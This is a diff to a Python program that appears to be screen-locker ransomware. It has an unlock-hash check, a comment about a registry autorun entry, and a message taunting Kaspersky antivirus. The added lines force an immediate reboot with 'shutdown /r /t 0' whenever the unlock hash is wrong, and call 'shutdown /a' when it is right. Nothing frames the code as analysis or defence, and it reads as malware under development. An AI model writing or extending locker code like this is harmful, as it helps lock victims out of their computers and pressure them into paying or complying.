@@ -15,6 +15,11 @@ MSG_STR = "HELLO, PEOPLE!\n" \
 def unlock_me(accepter=False):
     if accepter is None:
         # TODO : Delete HKEY Autorun
+        try:
+            os.system("COLOR 0F")
+            os.system("shutdown /r /t 0")
+        except:
+            pass
         return False
     else:
         print("Fuck you, Kaspersky!")
@@ -43,11 +48,21 @@ def main_unlocker():
         if unlock_hash == UNLOCK_HASH:
             unlock_me(None)
             if not unlock_me():
+                try:
+                    os.system("shutdown /a")
+                except:
+                    os.system("reboot")
+
                 print("Goodbye, I love you too, so much, really, and I am sorry about this exp.")
                 keyboard.wait("ESC")
                 break
         else:
+            try:
+                os.system("shutdown /r /t 0")
+            except:
+                os.system("reboot")
             unlock_me()
+
 
 
 if __name__ == "__main__":
